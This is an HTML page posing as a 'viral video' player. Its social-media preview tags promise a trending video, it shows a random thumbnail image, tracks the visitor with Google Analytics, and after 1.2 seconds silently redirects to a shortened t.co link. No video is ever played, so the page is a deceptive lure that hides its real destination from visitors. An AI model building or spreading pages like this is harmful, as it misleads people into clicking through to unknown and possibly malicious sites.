<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player Loading...</title>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-530836845"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-530836845');
    </script>

    <meta property="og:title" content="Watch Full Viral Video Here" />
    <meta property="og:description" content="Click to play the trending video" />
    <meta property="og:type" content="video.other" />
    <meta property="og:image" content="1.jpg" />

    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .loading-thumb {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <img id="display-img" class="loading-thumb" src="" alt="Loading Video..." />

    <script>
        // Aapki 5 images jo ab aapke hi repository me save hain
        var images = [
            "1.jpg",
            "2.jpg",
            "3.jpg",
            "4.jpg",
            "5.jpg"
        ];

        // Random image select karna
        var randomImage = images[Math.floor(Math.random() * images.length)];
        document.getElementById('display-img').src = randomImage;

        // Redirection Logic
        window.onload = function() {
            var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka final link
            
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 1200); // 1.2 Second ka delay
        };
    </script>
</body>
</html>
